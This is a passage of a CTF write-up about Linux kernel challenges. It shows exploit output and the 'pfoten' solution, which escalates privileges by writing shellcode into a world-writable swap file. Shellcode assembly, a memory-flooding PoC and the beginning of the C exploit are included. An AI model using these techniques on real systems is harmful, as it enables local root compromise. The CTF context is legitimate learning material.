+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/ $ /exp
+[+] open ko, return 3
+[*] try to read from kernel, return 320
+[*] kernel base is ffffffff95200000
+[*] Reg saved cs = 33, ss = 2b, flags = 206, user_sp = 7ffce5505978
+[*] Prepared payload to overwrite modprobe_path
+[*] Returned to userland, setting up for fake modprobe
+[*] Run unknown file
+/tmp/dummy: line 1: ����: not found
+[*] Hopefully flag is readable
+flag{TEST}
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="pfoten--18-solves--370-points">pfoten | 18 solves | 370 points</h2>
+<p>A challenge containing no bug module or driver.</p>
+<blockquote>
+<p>Note:</p>
+<p>The kernel is a standard Linux kernel, we didn’t add any vulnerabilities.</p>
+</blockquote>
+<p>Sounds like problems can only be found in init file</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">x1do0@x1do0:~/kernel_learning/pfoten$ cat ./files/etc/init.d/rcS
+<span class="c1">#!/bin/sh</span>
+
+/bin/busybox --install -s
+
+stty raw -echo
+
+chown -R 0:0 /
+
+mkdir -p /proc <span class="o">&amp;&amp;</span> mount -t proc none /proc
+mkdir -p /dev  <span class="o">&amp;&amp;</span> mount -t devtmpfs devtmpfs /dev
+mkdir -p /tmp  <span class="o">&amp;&amp;</span> mount -t tmpfs tmpfs /tmp
+
+<span class="nb">umask</span> <span class="m">111</span>
+
+dd <span class="k">if</span><span class="o">=</span>/dev/zero <span class="nv">bs</span><span class="o">=</span>1M <span class="nv">count</span><span class="o">=</span><span class="m">10</span> <span class="nv">of</span><span class="o">=</span>/swap <span class="nv">status</span><span class="o">=</span>none
+losetup /dev/loop0 /swap
+mkswap /dev/loop0 &gt;/dev/null
+swapon /dev/loop0 &gt;/dev/null
+</code></pre></td></tr></table>
+</div>
+</div><p>I didn&rsquo;t quite familiar with linux bash grammar. After looking for some information, I finally found out what he did.</p>
+<ol>
+<li>
+<p>set mask of file mode creation[4] as 111, which means all users can open and read the following files created.</p>
+</li>
+<li>
+<p>add a 10MB size file /swap, filled with zero</p>
+</li>
+<li>
+<p>correlate /dev/loop0 with /swap using losetup[5]</p>
+</li>
+<li>
+<p>construct a swap space in loop0 using kaswap[6] and enable by swapon</p>
+</li>
+</ol>
+<p>But to fully understand the meanings, we should go deep into linux swap files[7]. Shortly, swap files is a cache for physical RAM. When RAM memory is insufficient, kernel will copy some memory to swap files on the hard disk temporarily in order to leave more memory in RAM.</p>
+<p>So you might find the bugs here too. Swap files should never be directly writed by users because when the swap operation happens between RAM and swap files, deliberately constructed data writed in swap files will be directly copy to RAM memory!</p>
+<p>Let&rsquo;s see what will happen if we keep mmaping to occupy virtual memory.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;memory.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+                <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">);</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+                <span class="n">system</span><span class="p">(</span><span class="s">&#34;strings /swap&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/ $ /poc &gt; /tmp/out
+[   39.624986] Out of memory: Killed process 79 (poc) total-vm:45108kB, anon-rss:40kB, file-rss:4kB, shmem-rss:36004kB,0
+Killed
+/ $ vi /tmp/out
+</code></pre></td></tr></table>
+</div>
+</div><p>After a few iterations, swap file will be filled with other things, which is actually some infrequently used memory staff.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">...
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+bq<span class="p">|</span>H
+GCC: <span class="o">(</span>Ubuntu 9.3.0-17ubuntu1~20.04<span class="o">)</span> 9.3.0
+stapsdt
+libc
+lll_lock_wait_private
+8@%rdi
+stapsdt
+libc
+memory_mallopt_arena_max
+8@%rax 8@32+mp_<span class="o">(</span>%rip<span class="o">)</span>
+stapsdt
+libc
+memory_mallopt_arena_test
+8@%rax 8@24+mp_<span class="o">(</span>%rip<span class="o">)</span>
+stapsdt
+...
+Aug <span class="m">23</span> 02:05:37
+&lt;30&gt;Aug <span class="m">23</span> 02:05:37 nit: starting pid 78, tty <span class="s1">&#39;&#39;</span>: <span class="s1">&#39;-setuidgid 1 sh&#39;</span>
+starting pid 78, tty <span class="s1">&#39;&#39;</span>: <span class="s1">&#39;-setuidgid 1 sh&#39;</span>
+::sysinit:/etc/init.d/rcS
+::once:-setuidgid <span class="m">1</span> sh
+<span class="c1">#!/bin/sh</span>
+/bin/busybox --install -s
+stty raw -echo
+chown -R 0:0 /
+mkdir -p /proc <span class="o">&amp;&amp;</span> mount -t proc none /proc
+mkdir -p /dev  <span class="o">&amp;&amp;</span> mount -t devtmpfs devtmpfs /dev
+mkdir -p /tmp  <span class="o">&amp;&amp;</span> mount -t tmpfs tmpfs /tmp
+<span class="nb">umask</span> <span class="m">111</span>
+dd <span class="k">if</span><span class="o">=</span>/dev/zero <span class="nv">bs</span><span class="o">=</span>1M <span class="nv">count</span><span class="o">=</span><span class="m">10</span> <span class="nv">of</span><span class="o">=</span>/swap <span class="nv">status</span><span class="o">=</span>none
+losetup /dev/loop0 /swap
+mkswap /dev/loop0 &gt;/dev/null
+swapon /dev/loop0 &gt;/dev/null
+D<span class="k">$(</span>t
+L<span class="nv">$8</span>H
+<span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>A^
+AWAVI
+AUATI
+<span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>A^A_
+ATUI
+<span class="o">[]</span>A<span class="se">\
+</span><span class="se"></span>...
+</code></pre></td></tr></table>
+</div>
+</div><p>You can see that even the memory of this ELF executable file was dumped into /swap.</p>
+<p>According to Mr.2019[8], we can garble the init or exit process of busybox to shellocode, cuz they are running on root privelege. After compiling busybox with symbols, we can find specific sequences which indicate where the functions are and whether the memory is swaped into /swap.</p>
+<p>I tried but it didn&rsquo;t work for me, finding the sequences is a probablistic incident (actually quite rare). And even when I found the sequences after tons of failure, shellcode I write was not triggered at all.</p>
+<p>I discussed with my fellow teammate pu1p[9]. He found that edit <code>syscall</code> function can gain much higher probability to trigger shellcode we write. It turned out the same on my machine.</p>
+<p>What&rsquo;s more, we use exit machine code as a needle to indicate where the exit is and whether it&rsquo;s swaped.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm">   <span class="err">0:</span>   <span class="err">48</span> <span class="err">63</span> <span class="nf">ff</span>                <span class="no">movsxd</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">edi</span>
+   <span class="err">3:</span>   <span class="nf">b8</span> <span class="no">e7</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0xe7</span>
+   <span class="err">8:</span>   <span class="err">0</span><span class="nf">f</span> <span class="mi">05</span>                   <span class="no">syscall</span>
+   <span class="nl">a:</span>   <span class="nf">ba</span> <span class="mi">3</span><span class="no">c</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span> <span class="mi">0x3c</span>
+   <span class="nl">f:</span>   <span class="err">48</span> <span class="err">89</span> <span class="nf">d0</span>                <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">rdx</span>
+  <span class="err">12:</span>   <span class="err">0</span><span class="nf">f</span> <span class="mi">05</span>                   <span class="no">syscall</span>
+  <span class="err">14:</span>   <span class="nf">eb</span> <span class="no">f9</span>                   <span class="no">jmp</span>    <span class="mi">0xf</span>
+  <span class="err">16:</span>   <span class="err">48</span> <span class="err">89</span> <span class="nf">f8</span>                <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">rdi</span>
+  <span class="err">19:</span>   <span class="err">48</span> <span class="err">89</span> <span class="nf">f7</span>                <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rsi</span>
+  <span class="err">1</span><span class="nl">c:</span>   <span class="err">48</span> <span class="err">89</span> <span class="nf">d6</span>                <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span> <span class="no">rdx</span>
+  <span class="err">1</span><span class="nl">f:</span>   <span class="err">48</span> <span class="err">89</span> <span class="nf">ca</span>                <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">rcx</span>
+  <span class="err">22:</span>   <span class="err">4</span><span class="nf">d</span> <span class="mi">89</span> <span class="no">c2</span>                <span class="no">mov</span>    <span class="no">r10</span><span class="p">,</span> <span class="no">r8</span>
+  <span class="err">25:</span>   <span class="err">4</span><span class="nf">d</span> <span class="mi">89</span> <span class="no">c8</span>                <span class="no">mov</span>    <span class="no">r8</span><span class="p">,</span> <span class="no">r9</span>
+  <span class="err">28:</span>   <span class="err">4</span><span class="nf">c</span> <span class="mi">8</span><span class="no">b</span> <span class="mi">4</span><span class="no">c</span> <span class="mi">24</span> <span class="mi">08</span>          <span class="no">mov</span>    <span class="no">r9</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x8</span><span class="p">]</span>
+  <span class="err">2</span><span class="nl">d:</span>   <span class="err">0</span><span class="nf">f</span> <span class="mi">05</span>                   <span class="no">syscall</span>
+  <span class="err">2</span><span class="nl">f:</span>   <span class="nf">c3</span>                      <span class="no">ret</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Real shellcode is to open <code>sda/fd0</code>, read and write</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm">   <span class="err">0:</span>   <span class="err">6</span><span class="nf">a</span> <span class="mi">01</span>                   <span class="no">push</span>   <span class="mi">0x1</span>
+   <span class="err">2:</span>   <span class="nf">fe</span> <span class="mi">0</span><span class="no">c</span> <span class="mi">24</span>                <span class="no">dec</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="p">]</span>
+   <span class="err">5:</span>   <span class="err">48</span> <span class="nf">b8</span> <span class="mi">2</span><span class="no">f</span> <span class="mi">64</span> <span class="mi">65</span> <span class="mi">76</span> <span class="mi">2</span><span class="no">f</span>    <span class="no">movabs</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">0x3064662f7665642f</span>
+   <span class="nl">c:</span>   <span class="err">66</span> <span class="err">64</span> <span class="err">30</span>
+   <span class="nl">f:</span>   <span class="err">50</span>                      <span class="nf">push</span>   <span class="no">rax</span>
+  <span class="err">10:</span>   <span class="err">48</span> <span class="err">89</span> <span class="nf">e7</span>                <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rsp</span>
+  <span class="err">13:</span>   <span class="err">31</span> <span class="nf">d2</span>                   <span class="no">xor</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+  <span class="err">15:</span>   <span class="err">31</span> <span class="nf">f6</span>                   <span class="no">xor</span>    <span class="no">esi</span><span class="p">,</span> <span class="no">esi</span>
+  <span class="err">17:</span>   <span class="err">6</span><span class="nf">a</span> <span class="mi">02</span>                   <span class="no">push</span>   <span class="mi">0x2</span>
+  <span class="err">19:</span>   <span class="err">58</span>                      <span class="nf">pop</span>    <span class="no">rax</span>
+  <span class="err">1</span><span class="nl">a:</span>   <span class="err">0</span><span class="nf">f</span> <span class="mi">05</span>                   <span class="no">syscall</span>
+  <span class="err">1</span><span class="nl">c:</span>   <span class="err">48</span> <span class="err">89</span> <span class="nf">c7</span>                <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
+  <span class="err">1</span><span class="nl">f:</span>   <span class="err">31</span> <span class="nf">c0</span>                   <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+  <span class="err">21:</span>   <span class="err">31</span> <span class="nf">d2</span>                   <span class="no">xor</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+  <span class="err">23:</span>   <span class="nf">b6</span> <span class="mi">01</span>                   <span class="no">mov</span>    <span class="no">dh</span><span class="p">,</span> <span class="mi">0x1</span>
+  <span class="err">25:</span>   <span class="nf">be</span> <span class="mi">01</span> <span class="mi">01</span> <span class="mi">01</span> <span class="mi">01</span>          <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span> <span class="mi">0x1010101</span>
+  <span class="err">2</span><span class="nl">a:</span>   <span class="err">81</span> <span class="nf">f6</span> <span class="mi">01</span> <span class="mi">46</span> <span class="mi">71</span> <span class="mi">01</span>       <span class="no">xor</span>    <span class="no">esi</span><span class="p">,</span> <span class="mi">0x1714601</span>
+  <span class="err">30:</span>   <span class="err">0</span><span class="nf">f</span> <span class="mi">05</span>                   <span class="no">syscall</span>
+  <span class="err">32:</span>   <span class="err">6</span><span class="nf">a</span> <span class="mi">01</span>                   <span class="no">push</span>   <span class="mi">0x1</span>
+  <span class="err">34:</span>   <span class="err">5</span><span class="nf">f</span>                      <span class="no">pop</span>    <span class="no">rdi</span>
+  <span class="err">35:</span>   <span class="err">31</span> <span class="nf">d2</span>                   <span class="no">xor</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+  <span class="err">37:</span>   <span class="nf">b6</span> <span class="mi">01</span>                   <span class="no">mov</span>    <span class="no">dh</span><span class="p">,</span> <span class="mi">0x1</span>
+  <span class="err">39:</span>   <span class="nf">be</span> <span class="mi">01</span> <span class="mi">01</span> <span class="mi">01</span> <span class="mi">01</span>          <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span> <span class="mi">0x1010101</span>
+  <span class="err">3</span><span class="nl">e:</span>   <span class="err">81</span> <span class="nf">f6</span> <span class="mi">01</span> <span class="mi">46</span> <span class="mi">71</span> <span class="mi">01</span>       <span class="no">xor</span>    <span class="no">esi</span><span class="p">,</span> <span class="mi">0x1714601</span>
+  <span class="err">44:</span>   <span class="err">6</span><span class="nf">a</span> <span class="mi">01</span>                   <span class="no">push</span>   <span class="mi">0x1</span>
+  <span class="err">46:</span>   <span class="err">58</span>                      <span class="nf">pop</span>    <span class="no">rax</span>
+  <span class="err">47:</span>   <span class="err">0</span><span class="nf">f</span> <span class="mi">05</span>                   <span class="no">syscall</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Final exploits</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define PAGE_SIZE 0x80000
+</span><span class="cp">#define swap_size 0xa00000
+</span><span class="cp"></span>
+<span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">NEEDLE</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> 
+    <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> 
+    <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xC3</span>
+<span class="p">};</span>
+
+
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">swap_buf</span><span class="p">[</span><span class="n">swap_size</span><span class="p">];</span>
+
+<span class="kt">void</span> <span class="nf">die</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[!] %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">match</span><span class="p">(){</span>
+    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;/swap&#34;</span><span class="p">,</span> <span class="s">&#34;r+&#34;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="n">die</span><span class="p">(</span><span class="s">&#34;open /swap failed&#34;</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">read_cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+        <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">swap_buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">swap_size</span><span class="o">-</span><span class="n">read_cnt</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+        <span class="n">read_cnt</span> <span class="o">+=</span> <span class="n">res</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">read_cnt</span> <span class="o">!=</span> <span class="n">swap_size</span><span class="p">)</span> <span class="n">die</span><span class="p">(</span><span class="s">&#34;read failed&#34;</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="c1">// search for needle 
